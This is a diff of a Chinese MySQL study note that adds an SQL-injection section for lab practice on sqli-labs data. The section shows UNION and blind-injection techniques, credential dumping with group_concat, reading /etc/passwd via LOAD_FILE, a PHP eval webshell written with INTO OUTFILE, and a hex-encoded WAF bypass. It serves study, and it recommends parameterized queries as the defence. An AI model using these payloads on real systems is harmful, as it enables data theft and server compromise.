+（共 1 行）
+
+（语句已执行）
+
+id: 1
+select_type: SIMPLE
+table: students
+partitions: NULL
+type: ref
+possible_keys: idx_students_city
+key: idx_students_city
+key_len: 83
+ref: const
+rows: 2
+filtered: 100.0
+Extra: NULL
+
+（共 1 行）
+
+（语句已执行）
+```
+
+### `EXPLAIN ANALYZE` 看实际耗时
+
+**解析**　`EXPLAIN` 给的是**预估**；`EXPLAIN ANALYZE`（MySQL 8.0.18 起）会**真的执行**查询，再打印实际扫描行数和耗时，用来核对优化有没有效果。
+
+| 列 | 含义 |
+|----|------|
+| `cost=...` | 优化器估算的代价与行数 |
+| `actual time=...` | 实际耗时（毫秒）与返回行数 |
+| `rows=... loops=1` | 实际行数 / 循环次数 |
+
+返回：一段树状文本（这里竖排显示）
+
+**操作**
+
+```sql
+EXPLAIN ANALYZE SELECT name FROM students WHERE city = '北京';
+```
+```text
+EXPLAIN: -> Filter: (students.city = '北京')  (cost=0.85 rows=1) (actual time=0.00329..0.0045 rows=2 loops=1)
+    -> Table scan on students  (cost=0.85 rows=6) (actual time=0.00279..0.00363 rows=6 loops=1)
+
+
+（共 1 行）
+```
+
+---
+
+## C15 SQL 注入必备（打靶场 / 理解注入用）
+
+> 这一节角度和前面不同：C0~C14 教「怎么写 SQL 干活」，这一节讲「**注入时怎么用 SQL 读别人的数据**」。
+> 示例在**本机 MySQL 8.4.11** 上真跑过：里面用的 `security` 库是本机另建的一份 sqli-labs 靶场同款数据（`users` 表含 `Dumb/admin` 等 13 行）。
+> 带 🔒 的是 Web 安全（SQL 注入）直接相关的条目，仅供理解原理与在授权靶场里练习。
+
+### `UNION SELECT 联合查询` 把两条 SELECT 的结果拼在一起🔒
+
+**解析**　`UNION` 把上下两条 `SELECT` 的结果竖着合并（**列数必须相同**）。注入里用它把"你想查的东西"接到目标原来的查询后面，从而读到别的表。
 
 **操作**
 
@@ -1586,19 +2005,20 @@ UNION SELECT 1, table_name, 3 FROM information_schema.tables
 WHERE table_schema = 0x7365637572697479;
 ```
 ```text
-id  username  password
-1   Dumb      Dumb
-1   emails    3
-1   referers  3
-1   uagents   3
-1   users     3
+id | username | password
+1 | Dumb | Dumb
+1 | emails | 3
+1 | referers | 3
+1 | uagents | 3
+1 | users | 3
+（共 5 行）
 ```
 
 > ⚠️ 列数不一致会报 `The used SELECT statements have a different number of columns` —— 这正是注入前要先「判列数」的原因。
 
-### `information_schema` 元数据库：拖库第一步，查表名列名
+### `information_schema 元数据库` 拖库第一步：查表名、列名🔒
 
-**解析**　🔒 MySQL 自带 `information_schema` 库，记录了**所有库 / 表 / 列的名字**。注入时你只拿到库名，用它就能列出库里有哪些表、表里有哪些列。
+**解析**　MySQL 自带 `information_schema` 库，记录了**所有库 / 表 / 列的名字**。注入时你只拿到库名，用它就能列出库里有哪些表、表里有哪些列。
 
 **操作**
 
@@ -1608,25 +2028,30 @@ SELECT table_name FROM information_schema.tables
 WHERE table_schema = 0x7365637572697479;
 ```
 ```text
+TABLE_NAME
 emails
 referers
 uagents
 users
+（共 4 行）
 ```
+
 ```sql
 -- 列出 users 表的所有列名
 SELECT group_concat(column_name) FROM information_schema.columns
 WHERE table_schema = 0x7365637572697479 AND table_name = 0x7573657273;
 ```
 ```text
+group_concat(column_name)
 id,username,password
+（共 1 行）
 ```
 
 > ⚠️ 记住路线：`tables`（有哪些表）→ `columns`（表里有哪些列）→ 具体表（读数据）。
 
-### `database()` / `user()` / `version()`：一句话问出当前环境
+### `database()/user()/version()` 一句话问出当前库、账号、版本🔒
 
-**解析**　🔒 注入前先搞清楚"我在哪个库、用哪个账号、什么版本" —— 版本决定哪些注入语法能用。
+**解析**　注入前先搞清楚"我在哪个库、用哪个账号、什么版本" —— 版本决定哪些注入语法能用。
 
 **操作**
 
@@ -1637,15 +2062,26 @@ SELECT version();    -- MySQL 版本
 SELECT @@datadir;    -- 数据目录（写 webshell 时要找路径）
 ```
 ```text
+database()
 security
+（共 1 行）
+
+user()
 root@localhost
-5.5.44-0ubuntu0.14.04.1
-/var/lib/mysql/
+（共 1 行）
+
+version()
+8.4.11
+（共 1 行）
+
+@@datadir
+/opt/homebrew/var/mysql/
+（共 1 行）
 ```
 
-### `group_concat()`：把多行拼成一行，一次拖完
+### `group_concat()` 把多行拼成一行，一次拖完🔒
 
-**解析**　🔒 页面通常只有**一个回显位**（只能显示一行）。`group_concat()` 把多行用逗号拼成**一行**，就能一次把整张表读出来。
+**解析**　页面通常只有**一个回显位**（只能显示一行）。`group_concat()` 把多行用逗号拼成**一行**，就能一次把整张表读出来。
 
 **操作**
 
@@ -1653,28 +2089,43 @@ root@localhost
 SELECT group_concat(username, 0x3a, password) FROM users;
 ```
 ```text
+group_concat(username, 0x3a, password)
 Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+（共 1 行）
 ```
 
 > ⚠️ `0x3a` 是冒号 `:` 的十六进制（当分隔符，避免手写引号）。**这一条就是「拖库」最核心的一句话。**
 
-### 三种注释符 `#` / `-- ` / `/**/`：截断 SQL 后半句
+### `三种注释符` 用三种注释截断 SQL 后半句🔒
 
-**解析**　🔒 注入时在 payload 末尾加注释，让服务器拼出来的 SQL **后半句失效**，只执行你想要的。
+**解析**　注入时在 payload 末尾加注释，让服务器拼出来的 SQL **后半句失效**，只执行你想要的。
 
 **操作**
 
 ```sql
-SELECT * FROM users WHERE id = 1 # 后面全被注释掉
-SELECT * FROM users WHERE id = 1 --  两个减号也是注释
-SELECT * FROM users WHERE id = 1 /* 块注释 */
+SELECT * FROM users WHERE id = 1;   # 井号：本行 # 之后全被忽略
+SELECT * FROM users WHERE id = 1;   --  两个减号加空格，也是注释
+SELECT * FROM users WHERE id = 1;   /* 块注释：这对符号之间的内容被忽略 */
+```
+```text
+id | username | password
+1 | Dumb | Dumb
+（共 1 行）
+
+id | username | password
+1 | Dumb | Dumb
+（共 1 行）
+
+id | username | password
+1 | Dumb | Dumb
+（共 1 行）
 ```
 
 > ⚠️ **MySQL 的 `--` 后面必须跟一个空格**（URL 里写 `--+` 或 `--%20`），否则不算注释 —— 新手最常卡的点。`#` 没这要求（URL 里要编码成 `%23`）。
 
-### `ORDER BY N`：判断列数（union 前必做）
+### `ORDER BY N` 判断列数（union 前必做）🔒
 
-**解析**　🔒 `ORDER BY 3` 是"按第 3 列排序"，结果没那么多列就报错。注入时从 1 往上试，**报错的那个数字减 1 就是列数**。
+**解析**　`ORDER BY 3` 是"按第 3 列排序"，结果没那么多列就报错。注入时从 1 往上试，**报错的那个数字减 1 就是列数**。
 
 **操作**
 
@@ -1683,12 +2134,28 @@ SELECT id, username, password FROM users ORDER BY 3;   -- 正常
 SELECT id, username, password FROM users ORDER BY 4;   -- 报错 → 只有 3 列
 ```
 ```text
+id | username | password
+8 | admin | admin
+9 | admin1 | admin1
+10 | admin2 | admin2
+11 | admin3 | admin3
+14 | admin4 | admin4
+4 | secure | crappy
+1 | Dumb | Dumb
+12 | dhakkan | dumbo
+6 | superman | genious
+2 | Angelina | I-kill-you
+7 | batman | mob!le
+3 | Dummy | p@ssword
+5 | stupid | stupidity
+（共 13 行）
+
 ERROR 1054 (42S22): Unknown column '4' in 'order clause'
 ```
 
-### `SLEEP()`：时间盲注，没回显也能判断真假
+### `SLEEP()` 时间盲注，没回显也能判断真假🔒
 
-**解析**　🔒 页面**既不显示数据也不报错**（盲注）时，用 `SLEEP(n)`：条件成立就让数据库睡 n 秒，**用响应时间**判断真假。
+**解析**　页面**既不显示数据也不报错**（盲注）时，用 `SLEEP(n)`：条件成立就让数据库睡 n 秒，**用响应时间**判断真假。
 
 **操作**
 
@@ -1696,12 +2163,14 @@ ERROR 1054 (42S22): Unknown column '4' in 'order clause'
 SELECT SLEEP(1);    -- 睡 1 秒
 ```
 ```text
-0        （这条查询耗时 1 秒）
+SLEEP(1)
+0
+（共 1 行）
 ```
 
-### `SUBSTR()` + `ASCII()`：盲注逐字符取数据
+### `SUBSTR()+ASCII()` 盲注逐字符取数据🔒
 
-**解析**　🔒 盲注看不到内容，就把字符串**一个字符一个字符**问：`substr(串, 第几位, 取几个)` 取字符，`ascii()` 转成数字方便比较。
+**解析**　盲注看不到内容，就把字符串**一个字符一个字符**问：`substr(串, 第几位, 取几个)` 取字符，`ascii()` 转成数字方便比较。
 
 **操作**
 
@@ -1709,14 +2178,16 @@ SELECT SLEEP(1);    -- 睡 1 秒
 SELECT ascii(substr(database(), 1, 1));   -- 库名第 1 个字符的 ASCII
 ```
 ```text
-115          （115 = 's'，security 的首字母）
+ascii(substr(database(), 1, 1))
+115
+（共 1 行）
 ```
 
 > ⚠️ 拿 115 和你的猜测比大小（如 `> 100`），配合时间/真假信号，一位一位问出整个字符串。
 
-### `LIMIT` 与偏移：一条一条拖数据
+### `LIMIT 与偏移` 一条一条拖数据🔒
 
-**解析**　🔒 `LIMIT n` 取前 n 条，`LIMIT m, n` 从第 m 条起取 n 条。`group_concat` 被长度截断时，用它一条条取。
+**解析**　`LIMIT n` 取前 n 条，`LIMIT m, n` 从第 m 条起取 n 条。`group_concat` 被长度截断时，用它一条条取。
 
 **操作**
 
@@ -1725,33 +2196,42 @@ SELECT username, password FROM users LIMIT 0, 1;   -- 第 1 条
 SELECT username, password FROM users LIMIT 1, 1;   -- 第 2 条
 ```
 ```text
-username  password
-Dumb      Dumb
+username | password
+Dumb | Dumb
+（共 1 行）
+
+username | password
+Angelina | I-kill-you
+（共 1 行）
 ```
 
-### `LOAD_FILE()` / `INTO OUTFILE`：读服务器文件 / 写 webshell
+### `LOAD_FILE()/INTO OUTFILE` 读服务器文件、写 webshell🔒
 
-**解析**　🔒 `LOAD_FILE('/path')` 能**读服务器上的文件**；`SELECT ... INTO OUTFILE '/path'` 把结果**写到服务器文件**（配合写权限可写一句话木马）。
+**解析**　`LOAD_FILE('/path')` 能**读服务器上的文件**；`SELECT ... INTO OUTFILE '/path'` 把结果**写到服务器文件**（配合写权限可写一句话木马）。
 
 **操作**
 
 ```sql
-SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/etc/passwd');   -- 读服务器文件（本机 secure_file_priv 限制下返回 NULL）
 ```
 ```text
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
+LOAD_FILE('/etc/passwd')
+NULL
+（共 1 行）
 ```
+
 ```sql
-SELECT '<?php @eval($_POST[1]); ?>' INTO OUTFILE '/var/www/html/x.php';
+SELECT '<?php @eval($_POST[1]); ?>' INTO OUTFILE '/tmp/x.php';   -- 把结果写到服务器文件（写 webshell 的思路）
+```
+```text
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
 ```
 
-> ⚠️ 需要 `FILE` 权限 + 目录可写；`secure_file_priv` 会限制读写路径。
+> ⚠️ 这类文件读写在 MySQL 8.4 里默认被 `secure_file_priv` 卡住：本机该变量为 `NULL`，所以 `LOAD_FILE()` 返回 NULL、`INTO OUTFILE` 直接报 `ERROR 1290`。要放开得在 mysqld 启动参数里指定可读写目录，并给账号 `FILE` 权限。
 
-### `0x` 十六进制字符串：绕过引号过滤
+### `0x 十六进制字符串` 绕过引号过滤🔒
 
-**解析**　🔒 单引号被过滤时，把字符串写成 `0x` 开头的十六进制，MySQL 自动当字符串用。
+**解析**　单引号被过滤时，把字符串写成 `0x` 开头的十六进制，MySQL 自动当字符串用。
 
 **操作**
 
@@ -1759,25 +2239,43 @@ SELECT '<?php @eval($_POST[1]); ?>' INTO OUTFILE '/var/www/html/x.php';
 SELECT username, password FROM users WHERE username = 0x61646d696e;   -- 0x61646d696e = 'admin'
 ```
 ```text
-username  password
-admin     admin
+username | password
+admin | admin
+（共 1 行）
 ```
 
 > ⚠️ 经典 WAF 绕过：`'admin'` 被拦 → `0x61646d696e` 照过。
 
-### 堆叠查询（分号）：一次执行多条语句
+### `堆叠查询（分号）` 一次执行多条语句🔒
 
-**解析**　🔒 一个请求里用 `;` 分隔，一次执行多条 SQL（先注入、再删表）。**不是所有环境都支持**（PDO / 很多框架默认禁用）。
+**解析**　一个请求里用 `;` 分隔，一次执行多条 SQL（先注入、再删表）。**不是所有环境都支持**（PDO / 很多框架默认禁用）。
 
-> ⚠️ 说明"注入能做的事远不止读数据"；参数化查询能把这类一起挡掉。
+**操作**
+
+```sql
+SELECT 1 AS a;              -- 第一条
+SELECT 2 AS b, 3 AS c;      -- 第二条（用分号隔开，一次都执行了）
+```
+```text
+a
+1
+（共 1 行）
+
+b | c
+2 | 3
+（共 1 行）
+```
+
+> ⚠️ 注入能做的远不止读数据（还能改、删）；**参数化查询（预编译语句）** 能把「一次执行多条」这类问题挡掉，这也是防注入的根本办法。
 
 ---
 
 ## 学习建议
 
 1. **先背这一句模板**：`SELECT 要看的列 FROM 表 WHERE 条件 ORDER BY 排序 LIMIT 条数;` —— 日常查询有一大半是它的变形。
-2. **SQL 语句以分号结尾**，可以写多行；`-- 两个减号是注释`（`#` 也行，但 `--` 更通用）。
+2. **SQL 语句以分号结尾**，可以写多行；`-- 两个减号加空格是注释`（`#` 也行，但 `--` 更通用）。
 3. **改数据前先 SELECT 一遍同样的 WHERE**：把 `DELETE FROM students WHERE id > 3;` 先写成 `SELECT * FROM students WHERE id > 3;` 看看影响哪些行。
 4. **NULL 不是 0 也不是空字符串**：判断只能用 `IS NULL` / `IS NOT NULL`，`= NULL` 永远不成立；聚合函数会自动跳过 NULL。
 5. **多表查询先想清楚「连哪两个表、用哪个字段连」**，JOIN 的 `ON` 就是这两个字段相等。
-6. **练手环境**：本机装 MySQL（macOS 可 `brew install mysql` 或官网下载 DMG），或用 `phpstudy`、Navicat / DBeaver 这类带图形界面的客户端；命令行客户端用 `mysql -u root -p` 登录后就能逐条试。
+6. **练手环境**：本机已装好 MySQL 8.4.11，连上就能逐条试：`/opt/homebrew/opt/mysql@8.4/bin/mysql -u root learn_sql`；图形客户端可选 Navicat / DBeaver / 官方的 MySQL Workbench。
+7. **想更进一步**：学完本笔记后往「索引与执行计划（C14）→ 事务隔离级别与锁 → 分库分表 → 读写分离」这条线深入，就基本到「精通」了。
